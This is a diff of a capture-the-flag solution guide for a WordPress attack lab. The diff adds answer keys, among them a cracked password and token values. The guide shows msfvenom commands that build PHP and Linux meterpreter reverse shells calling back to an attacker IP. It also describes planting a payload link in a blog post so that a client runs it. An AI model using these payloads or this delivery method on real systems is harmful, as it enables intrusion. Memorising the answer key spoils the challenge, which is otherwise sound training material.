@@ -6,6 +6,8 @@ _Solution Guide_
 
 Exploit a pirate's WordPress site by gaining administrator access and altering malicious scripts.  You will need to crack a password, examine the site files and find a token, and alter a link to deliver a malicious payload.  Finally, gain access to the files on the website and get the last token.
 
+When deploying a hosted version of this challenge, answers are randomly generated for each deployment. This guide provides the steps to solve the challenge and the answers for the artifacts provided in the challenge directory.
+
 ### Setup
 
 Ensure you have run `sudo dhclient eth0` on Samus and/or verify that you have an IP of 123.45.200.201/16 before starting the challenge.
@@ -15,6 +17,8 @@ Ensure you have run `sudo dhclient eth0` on Samus and/or verify that you have an
 ## Question 1
 
 _What is the cracked password for the user Ridley?_
+
+**Answer:** ridleyGTsamus
 
 First, players are likely to browse to the site to see what it looks like. You will be presented with the generic WordPress page. Scanning the site would be prudent to discover the default login and admin pages, unless players are familiar with the defaults.
 
@@ -31,12 +35,12 @@ You could write a simple hashing script to hash each line of the file and write 
 ```
 import hashlib
 
-def compute_MD5_hash(string, encoding=\'utf-8\'):
+def compute_MD5_hash(string, encoding='utf-8'):
     md5_hasher = hashlib.md5()
     md5_hasher.update(string.encode(encoding))
     return md5_hasher.hexdigest()
 
-with open(\"/home/user/Desktop/wordlist.txt\") as f:
+with open("/home/user/Desktop/wordlist.txt") as f:
     for line in f:
         print(compute_MD5_hash(line))
 ```
@@ -49,7 +53,9 @@ With this password you can login to the WordPress site and/or the admin page, as
 
 ## Question 2
 
-_What is the token found on the webserver with the WordPress site files?_
+_What is the token found on the web server with the WordPress site files?_
+
+**Answer:** 4c0413e98f0c
 
 The challenge files provides a Github vulnerability page on the Elementor plugin in WordPress (CVE-2022-1329). It would be up to the players to figure out if this is viable, which is evident by the fact that the Elementor plugin is in fact installed and includes one of the vulnerable versions. Players could try the other vulnerabilities, but this is the intended method of gaining remote access to the underlying server.
 
@@ -59,7 +65,7 @@ Within the exploit page provided, there is an example zip package containing a f
 
 You will not need the exploit python script since you have access to the admin plugins page of the site and can upload this package directly.
 
-An example generation of this php reverse shell payload might look like the following (you can use any port you like, but it might be a good idea to NOT use 443 so that you can use it later in the challenge:
+An example generation of this php reverse shell payload might look like the following (you can use any port you like, but it might be a good idea to ***not*** use 443 so that you can use it later in the challenge:
 
 ```
 msfvenom -p php/meterpreter/reverse_tcp LHOST=123.45.200.201 LPORT=5555
@@ -68,7 +74,7 @@ msfvenom -p php/meterpreter/reverse_tcp LHOST=123.45.200.201 LPORT=5555
 
 ![](./img/c34-image4.png)
 
-Then add the payload pho fucntion to the elementor-pro.php file in the provided Github elementor-pro.zip package with this payload php code instead. Keep the name, and then rezip the contents into a zip file named elementor.pro.zip that preserves the previous contents.
+Then add the payload php function to the elementor-pro.php file in the provided Github elementor-pro.zip package with this payload php code instead. Keep the name, and then rezip the contents into a zip file named elementor.pro.zip that preserves the previous contents.
 
 It should look something like this:
 
@@ -105,14 +111,15 @@ The hexadecimal string found in the token1 file is the answer for submission for
 
 _What is the token provided from the grading server for successfully replacing the Connect With Me link in the blog post?_
 
+**Answer:** This token cannot be retrieved in the offline version of the challenge.
+
 First, based on the information provided in the challenge instructions, we know the client to be an x64 architecture based Ubuntu/Linux system. Therefore, the reverse shell payload that we create must be for Linux and of an x64 type.
 
 An example generation of this payload might look like the following:
 
 ```
-msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=123.45.200.201 LPORT=443 -f elf \> connectwithme.elf
+msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=123.45.200.201 LPORT=443 -f elf > connectwithme.elf
 ```
-
 Remember to name the file appropriately so that the grading check can get the proper file.
 
 Next, edit the "Call to Arms" post as Ridley (who is the author) and change the link that says "Connect With Me" to point to your payload at `http://123.45.200.201/connectwithme.elf` instead of the email link originally provided.
@@ -145,7 +152,9 @@ Your payload will be downloaded and initiated in the background when the grading
 
 _What is the obfuscated token string found on the client system within the traitor's home directory contents?_
 
-Once you have gained remote access to the client through the reverse shell, search through the contents of Cypher's home folder at /home/cypher. You'll need to verify its existence first.
+**Answer:** 1b4b9c8d7d18
+
+Once you have gained remote access to the client through the reverse shell, search through the contents of Cypher's home folder at **/home/cypher**. You'll need to verify its existence first.
 
 ![](./img/c34-image17.png)
 
